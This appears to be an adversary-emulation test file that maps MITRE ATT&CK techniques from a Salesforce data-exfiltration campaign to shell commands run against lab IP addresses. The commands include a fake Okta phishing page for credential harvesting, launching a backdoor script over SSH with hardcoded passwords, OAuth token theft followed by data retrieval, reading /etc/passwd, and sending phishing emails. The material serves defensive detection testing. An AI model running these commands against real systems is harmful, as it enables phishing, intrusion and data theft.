name: T1608.005 - Link Target
description: During Salesforce Data Exfiltration, threat actors established an Okta phishing panel which victims were tricked into accessing from mobile phones or work computers during social engineering calls.

executors.name: sh
executors.command: curl http://172.21.0.20/ > okta_fake_login.html && echo "Send the link http://172.21.0.20/ to target users for credential harvesting"

name: T1059.006 - Python
description: During Salesforce Data Exfiltration, threat actors used custom applications developed in python.

executors.name: sh
executors.command: sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'if ! ss -tuln | grep -q ":5055 "; then su attacker -c "python3 /home/attacker/malware/backdoor.py &"; else echo "Port 5055 already in use"; fi'

name: T1213.004 - Customer Relationship Management Software
description: During Salesforce Data Exfiltration, threat actors accessed and exfiltrated sensitive information from compromised Salesforce instances.

name: T1671 - Cloud Application Integration
description: During Salesforce Data Exfiltration, threat actors deceived victims into authorizing malicious connected apps to their organization's Salesforce portal.

executors.name: sh
executors.command: curl -X POST -H "Content-Type: application/json" -d '{"client_id":"malicious_app"}' http://172.21.0.20:8444/oauth/authorize && TOKEN=$(curl -s -X POST -H "Content-Type: application/json" -d '{"client_id":"malicious_app"}' http://172.21.0.20:8444/oauth/authorize | sed -n 's/.*"access_token" *: *"\([^"]*\)".*/\1/p') && curl -H "Authorization: Bearer $TOKEN" http://172.21.0.20:8444/data

name: T1078.002 - Domain Accounts
description: During Salesforce Data Exfiltration, threat actors used compromised credentials for lateral movement.

name: T1567 - Exfiltration Over Web Service
description: During Salesforce Data Exfiltration, threat actors exfiltrated data via legitimate Salesforce API communication channels including the Salesforce Data Loader application.

name: T1036 - Masquerading
description: During Salesforce Data Exfiltration, threat actors used voice calls to socially engineer victims into authorizing a modified version of the Salesforce Data Loader app.

name: T1090 - Proxy
description: During Salesforce Data Exfiltration, threat actors used Mullvad VPN IPs to proxy voice phishing calls.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p "RootPass123" ssh -o StrictHostKeyChecking=no root@172.22.0.20 "cat /etc/passwd"'

name: T1585.002 - Email Accounts
description: During Salesforce Data Exfiltration, threat actors registered emails shinycorp@tuta[.]com and shinygroup@tuta[.]com to send victims extortion demands.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Test email from attacker" | mail -s "Test Subject" shinycorp@tuta.com'

name: T1083 - File and Directory Discovery
description: During Salesforce Data Exfiltration, threat actors queried customers' Salesforce environments to identify sensitive information for exfiltration.

name: T1090.003 - Multi-hop Proxy
description: During Salesforce Data Exfiltration, threat actors used Tor IPs for voice calls and for the collection of stolen data.

name: T1585 - Establish Accounts
description: During Salesforce Data Exfiltration, threat actors created Salesforce trial accounts to register their malicious applications.

executors.name: sh
executors.command:
sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 "id -u fakepersona &>/dev/null || useradd -m fakepersona; echo 'fakepersona:FakePass123' | chpasswd" 
sshpass -p 'FakePass123' ssh -o StrictHostKeyChecking=no fakepersona@172.21.0.20 'hostname; whoami; echo "====="; echo "$(whoami) on $(uname -n) registering something using fakepersona."'

name: T1587.001 - Malware
description: During Salesforce Data Exfiltration, threat actors created malicious applications within Salesforce trial accounts, typically Python scripts with similar function to the Salesforce Data Loader.

name: T1588.002 - Tool
description: During Salesforce Data Exfiltration, threat actors initially relied on the legitimate Salesforce Data Loader app for data exfiltration.

name: T1020 - Automated Exfiltration
description: During Salesforce Data Exfiltration, threat actors used API queries to automatically exfiltrate large volumes of data.

name: T1586.002 - Email Accounts
description: During Salesforce Data Exfiltration, threat actors used compromised emails to create Salesforce trial accounts.

executors.name: sh
executors.command:
sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 "id -u fakepersonax &>/dev/null || useradd -m fakepersonax; echo 'fakepersonax:FakePass123' | chpasswd" 
sshpass -p 'FakePass123' ssh -o StrictHostKeyChecking=no fakepersonax@172.21.0.20 'hostname; whoami; echo "====="; echo "$(whoami) on $(uname -n) registering something using fakepersona."'

name: T1598.004 - Spearphishing Voice
description: During Salesforce Data Exfiltration, threat actors initiated voice calls with victims to socially engineer them into authorizing malicious applications or divulging sensitive credentials.

executors.name: sh
executors.command: echo 'Run some automatic call script with a wav play here'

name: T1656 - Impersonation
description: During Salesforce Data Exfiltration, threat actors impersonated IT support personnel in voice calls with victims at times claiming to be addressing enterprise-wide connectivity issues.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Click here and give me your password" | mail -s "Password Expired" victim@labcdcfake.com'
